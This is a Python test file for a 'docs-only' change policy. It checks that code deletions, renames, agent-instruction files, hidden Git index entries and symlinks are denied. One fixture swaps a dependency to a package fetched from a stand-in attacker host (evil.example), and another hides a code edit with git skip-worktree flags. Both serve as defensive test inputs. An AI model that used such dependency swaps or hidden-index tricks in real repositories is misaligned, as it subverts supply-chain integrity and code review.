"""Real Git path enumeration closes the docs preset deletion and rename gaps."""

from __future__ import annotations

from datetime import UTC, datetime
import os
from uuid import uuid4

import pytest

from backend.app.git.state import GitStateTracker
from backend.app.assurance.engine import contract_digest
from backend.app.assurance.store import EvidenceStore
from backend.app.contracts.models import ChangeContract, DiffCoverageResult
from backend.app.passport.v2 import PassportV2Issuer
from backend.app.policy.presets import PresetEvidence, evaluate_preset
from backend.tests.passport.test_builder import _database, _seed_change
from backend.tests.support_kb import git, make_repo, write


@pytest.mark.parametrize("change", ["delete-code", "rename-code", "dependency-swap", "docs-edit"])
def test_docs_preset_uses_full_git_inventory(tmp_path, change: str) -> None:
    from backend.app.policy.path_evidence import documentation_paths
    root = make_repo(tmp_path / "repo", {
        "README.md": "hello\n", "payments.py": "def charge(): return 1\n",
        "requirements.txt": "requests==2.32.0\n",
    })
    tracker = GitStateTracker()
    identifier = uuid4()
    baseline = tracker.capture(identifier, "BASELINE", str(root), 1, 1_048_576)
    if change == "delete-code":
        (root / "payments.py").unlink()
        write(root, "README.md", "updated\n")
    elif change == "rename-code":
        (root / "payments.py").rename(root / "payments.md")
    elif change == "dependency-swap":
        write(root, "requirements.txt", "requests @ https://evil.example/pkg.tar.gz\n")
    else:
        write(root, "README.md", "updated\n")
    tested = tracker.capture(identifier, "TESTED", str(root), 1, 1_048_576)
    paths, modes, error = documentation_paths(baseline, tested)
    assert error is None
    assert not modes
    decision = evaluate_preset(preset_name="docs-only", change_type="docs",
                               evidence=PresetEvidence(checks_passed=True, freshness="CURRENT",
                                                       changed_paths=paths))
    assert decision.status == ("ALLOW" if change == "docs-edit" else "DENY")
    if change == "delete-code":
        assert "payments.py" in paths
    if change == "rename-code":
        assert {"payments.py", "payments.md"} <= set(paths)


@pytest.mark.parametrize("change", ["delete-code", "rename-code", "dependency-swap", "docs-edit"])
def test_passport_docs_decision_uses_bound_git_paths(tmp_path, change: str) -> None:
    root = make_repo(tmp_path / "repo", {
        "README.md": "hello\n", "payments.py": "def charge(): return 1\n",
        "requirements.txt": "requests==2.32.0\n",
    })
    database = _database(tmp_path)
    record = _seed_change(database)
    contract = ChangeContract(schema_version=3, policy_preset_name="docs-only",
                              policy_change_type="docs")
    with database.connection() as connection:
        connection.execute("UPDATE changes SET repository_path = ?, contract_json = ? WHERE id = ?",
                           (str(root), contract.model_dump_json(), str(record.id)))
    tracker = GitStateTracker()
    baseline = tracker.capture(record.id, "BASELINE", str(root), 1, 1_048_576)
    if change == "delete-code":
        (root / "payments.py").unlink()
        write(root, "README.md", "updated\n")
        old_coverage_path = "README.md"
    elif change == "rename-code":
        (root / "payments.py").rename(root / "payments.md")
        old_coverage_path = "payments.md"
    elif change == "dependency-swap":
        write(root, "requirements.txt", "requests @ https://evil.example/pkg.tar.gz\n")
        old_coverage_path = "requirements.txt"
    else:
        write(root, "README.md", "updated\n")
        old_coverage_path = "README.md"
    tested = tracker.capture(record.id, "TESTED", str(root), 1, 1_048_576)
    store = EvidenceStore(database)
    store.save_checkpoint(baseline)
    store.save_checkpoint(tested)
    now = datetime.now(UTC)
    store.save_diff_coverage(DiffCoverageResult(
        change_id=record.id, baseline_checkpoint_id=baseline.id,
        tested_checkpoint_id=tested.id, head_sha=tested.head_sha,
        status_digest=tested.status_digest,
        contract_digest=contract_digest(record.model_copy(update={"contract": contract})),
        started_at=now, completed_at=now, collector_status="COLLECTED",
        checks_passed=True, diff_exercised="NOT_APPLICABLE", freshness="CURRENT",
        excluded={old_coverage_path: "documentation"},
    ))
    payload = PassportV2Issuer(database).snapshot(record.id)
    assert payload.policy_decision == ("ALLOW" if change == "docs-edit" else "DENY")


def test_docs_allowlist_excludes_agent_instructions_and_build_files() -> None:
    for path in ("CLAUDE.md", "AGENTS.md", "GEMINI.md", ".claude/skills/guide.md",
                 ".cursor/rules/core.md", ".windsurf/rules.md", ".windsurfrules",
                 ".github/copilot-instructions.md", "requirements.txt", "CMakeLists.txt",
                 "README.py"):
        result = evaluate_preset(preset_name="docs-only", change_type="docs",
                                 evidence=PresetEvidence(checks_passed=True,
                                                         freshness="CURRENT", changed_paths=(path,)))
        assert result.status == "DENY", path


@pytest.mark.parametrize("flag", ["--assume-unchanged", "--skip-worktree"])
def test_docs_inventory_denies_hidden_index_entries(tmp_path, flag: str) -> None:
    from backend.app.policy.path_evidence import documentation_paths
    root = make_repo(tmp_path / "repo", {
        "README.md": "hello\n", "pay.py": "def charge(): return 1\n",
    })
    tracker = GitStateTracker()
    identifier = uuid4()
    baseline = tracker.capture(identifier, "BASELINE", str(root), 1, 1_048_576)
    git(root, "update-index", flag, "pay.py")
    write(root, "pay.py", "def charge(): return 999\n")
    write(root, "README.md", "updated\n")
    tested = tracker.capture(identifier, "TESTED", str(root), 1, 1_048_576)
    paths, modes, error = documentation_paths(baseline, tested)
    decision = evaluate_preset(preset_name="docs-only", change_type="docs",
                               evidence=PresetEvidence(checks_passed=True, freshness="CURRENT",
                                                       changed_paths=paths, mode_changed_paths=modes,
                                                       path_evidence_error=error))
    assert error == "hidden index entry (assume-unchanged or skip-worktree)"
    assert decision.status == "DENY"


def test_docs_inventory_ignores_build_output(tmp_path) -> None:
    from backend.app.policy.path_evidence import documentation_paths
    root = make_repo(tmp_path / "repo", {
        ".gitignore": "build/\n", "README.md": "hello\n",
    })
    tracker = GitStateTracker()
    identifier = uuid4()
    baseline = tracker.capture(identifier, "BASELINE", str(root), 1, 1_048_576)
    write(root, "build/out.bin", "artifact\n")
    write(root, "README.md", "updated\n")
    tested = tracker.capture(identifier, "TESTED", str(root), 1, 1_048_576)
    paths, modes, error = documentation_paths(baseline, tested)
    assert error is None
    assert paths == ("README.md",)
    decision = evaluate_preset(preset_name="docs-only", change_type="docs",
                               evidence=PresetEvidence(checks_passed=True, freshness="CURRENT",
                                                       changed_paths=paths, mode_changed_paths=modes,
                                                       path_evidence_error=error))
    assert decision.status == "ALLOW"


@pytest.mark.parametrize("staged", [False, True])
def test_docs_inventory_denies_new_symlink(tmp_path, staged: bool) -> None:
    from backend.app.policy.path_evidence import documentation_paths
    root = make_repo(tmp_path / "repo", {"README.md": "hello\n"})
    git(root, "config", "core.symlinks", "true")
    tracker = GitStateTracker()
    identifier = uuid4()
    baseline = tracker.capture(identifier, "BASELINE", str(root), 1, 1_048_576)
    os.symlink(root / "README.md", root / "linked.md")
    if staged:
        git(root, "add", "linked.md")
    tested = tracker.capture(identifier, "TESTED", str(root), 1, 1_048_576)
    paths, modes, error = documentation_paths(baseline, tested)
    assert error is None
    assert "linked.md" in paths
    assert "linked.md" in modes
